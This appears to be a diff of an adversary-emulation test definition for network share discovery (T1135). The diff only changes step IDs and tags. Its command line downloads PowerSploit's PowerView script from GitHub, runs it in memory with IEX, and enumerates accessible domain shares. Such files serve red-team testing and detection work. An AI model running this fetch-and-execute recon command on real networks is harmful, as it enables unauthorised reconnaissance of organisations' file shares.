@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "1c3e6189-650d-44b4-84f4-ef2aa1842846",
+      "id": "f86c35c2-9713-4060-bc75-19bfd35edb8c",
       "type": "execute-command",
       "data": {
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "4818e225-fd89-45b8-bacf-9acfe44b6338",
+      "id": "a8a0f0a2-74a0-48a3-ba8a-3a5a513d2b8a",
       "name": "Check dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "63874646-ec1b-4d6d-b9ec-e425c11c44a2",
+      "id": "3661c2d8-99be-4500-909a-4ed2814303cc",
       "name": "Resolve dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "929a84fa-32ea-4dc4-a47b-e310e67d2ee0",
+      "id": "52ce154a-ec9b-46b7-9f36-e3f1baa92128",
       "name": "Re-check dependency 1/1",
       "description": "Endpoint must be joined to domain\n",
       "type": "execute-command",
@@ -51,28 +51,27 @@
   ],
   "flows": [
     {
-      "s": "4818e225-fd89-45b8-bacf-9acfe44b6338",
+      "s": "a8a0f0a2-74a0-48a3-ba8a-3a5a513d2b8a",
       "p": "on-success",
-      "o": "1c3e6189-650d-44b4-84f4-ef2aa1842846"
+      "o": "f86c35c2-9713-4060-bc75-19bfd35edb8c"
     },
     {
-      "s": "4818e225-fd89-45b8-bacf-9acfe44b6338",
+      "s": "a8a0f0a2-74a0-48a3-ba8a-3a5a513d2b8a",
       "p": "on-failure",
-      "o": "63874646-ec1b-4d6d-b9ec-e425c11c44a2"
+      "o": "3661c2d8-99be-4500-909a-4ed2814303cc"
     },
     {
-      "s": "63874646-ec1b-4d6d-b9ec-e425c11c44a2",
+      "s": "3661c2d8-99be-4500-909a-4ed2814303cc",
       "p": "on-success",
-      "o": "929a84fa-32ea-4dc4-a47b-e310e67d2ee0"
+      "o": "52ce154a-ec9b-46b7-9f36-e3f1baa92128"
     },
     {
-      "s": "929a84fa-32ea-4dc4-a47b-e310e67d2ee0",
+      "s": "52ce154a-ec9b-46b7-9f36-e3f1baa92128",
       "p": "on-failure",
-      "o": "1c3e6189-650d-44b4-84f4-ef2aa1842846"
+      "o": "f86c35c2-9713-4060-bc75-19bfd35edb8c"
     }
   ],
   "tags": [
-    "T1135",
-    "atomic-red-team"
+    "T1135"
   ]
 }
